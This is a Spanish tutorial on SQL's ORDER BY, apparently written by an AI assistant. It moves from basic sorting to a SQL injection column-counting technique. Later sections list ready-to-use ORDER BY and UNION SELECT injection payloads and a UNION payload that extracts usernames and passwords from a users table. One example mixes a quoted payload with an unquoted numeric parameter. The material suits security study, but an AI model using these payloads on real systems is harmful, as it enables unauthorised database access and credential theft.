# Order by

---

`ORDER BY` sirve para **ordenar** los resultados de una consulta según una o varias columnas.

* `ORDER BY columna` → ordena por el contenido de `columna`. Por defecto `ASC` (ascendente).
* `ORDER BY columna DESC` → ordena de forma descendente.
* También se puede usar por **posición**: `ORDER BY 1` (primera columna del `SELECT`), `ORDER BY 2` (segunda), etc.

---

Tabla `products`:

| id | name       | category | price | released |
| -- | ---------- | -------- | ----- | -------- |
| 1  | Teddy Bear | Gifts    | 20    | 1        |
| 2  | Toy Car    | Toys     | 15    | 1        |
| 3  | Mug        | Gifts    | 8     | 0        |
| 4  | Chocolate  | Gifts    | 5     | 1        |
| 5  | Board Game | Toys     | 30    | 1        |

### Consultas y resultados

* `SELECT id, name, price FROM products ORDER BY price ASC;` → ordena por `price` (columna explícita).

* `SELECT id, name, price FROM products ORDER BY 2;` → ordena por la **segunda columna del SELECT**, es decir `name`.

Resultados (para `ORDER BY 2`):

| id | name       | price |
| -- | ---------- | ----- |
| 5  | Board Game | 30    |
| 4  | Chocolate  | 5     |
| 3  | Mug        | 8     |
| 1  | Teddy Bear | 20    |
| 2  | Toy Car    | 15    |

---

## `ORDER BY n` para contar columnas

* `ORDER BY n` se refiere a la **posición** `n` en la lista de columnas del `SELECT` (no a la tabla en sí).
* Si la consulta original tiene, por ejemplo, 3 columnas (`SELECT a, b, c ...`) y probás `ORDER BY 4`, el motor devolverá un **error** porque no existe la columna en la posición 4.
* En una inyección SQL, iterás `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3`, ... hasta que el `ORDER BY N` produce error. El primer `N` que falla indica que hay `N-1` columnas.

**Importante:** esto cuenta las columnas del `SELECT` que la aplicación construye, no necesariamente todas las columnas que tiene la tabla (salvo que el `SELECT` use `*`, en cuyo caso coinciden).

---

## 4) Ejemplo práctico (SQLi)

Imaginá que la app ejecuta internamente:

```sql
SELECT id, name, price FROM products WHERE id = <INPUT>
```

Si inyectás en `INPUT`:

* `1' ORDER BY 1--` → OK
* `1' ORDER BY 2--` → OK
* `1' ORDER BY 3--` → OK
* `1' ORDER BY 4--` → ERROR (no existe la 4ª columna)

Resultado: la consulta tiene 3 columnas.

**Si la consulta original fuera `SELECT * FROM products ...`**, el `ORDER BY` por posición se refiere a la expansión de `*` (todas las columnas de la tabla), por lo que el conteo te dirá cuántas columnas tiene la tabla en ese contexto.

---

## 5) Payloads listos para probar

* Parámetro **numérico** (sin comillas):

```
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 3--
1 ORDER BY 4--
```

* Parámetro **string** (necesita cerrar comilla):

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

* Alternativa con `UNION SELECT` (cuando no ves errores):

```
' UNION SELECT NULL--            -- prueba 1 columna
' UNION SELECT NULL, NULL--      -- prueba 2 columnas
' UNION SELECT NULL, NULL, NULL-- -- prueba 3 columnas
```

Cuando el `UNION` deje de fallar sabrás el número de columnas.

---

## 6) Advertencias y matices

* Si la aplicación **suprime errores**, `ORDER BY` no mostrará fallo visible. Usa `UNION` o inyección ciega (time/boolean).
* Si la consulta original ya contiene un `ORDER BY`, inyectar otro puede romper la sintaxis.
* Si el input se utiliza en otra parte del SQL (p. ej. dentro de una subquery), `ORDER BY` puede no referirse a la lista de columnas que esperás.
* En algunas bases o APIs la referencia por posición puede comportarse ligeramente distinto; la técnica es ampliamente válida en MySQL, PostgreSQL, MSSQL y Oracle en su forma básica.

---

## 7) Ejemplo final: usar el número de columnas para `UNION` y exfiltrar

Si descubriste que el `SELECT` tiene 3 columnas, podés probar:

```sql
' UNION SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--
```

Ajustá la columna que contiene texto para que la app la muestre (por ejemplo, si solo la 2ª columna aparece en la página, pon el payload en la 2ª posición: `NULL, payload, NULL`).

---

Si querés, lo subo al lienzo como archivo separado (por ejemplo `theory/ORDER_BY_SQLi.md`) y te genero un bloque listo para copiar en tu repo. ¿Querés que lo guarde así?
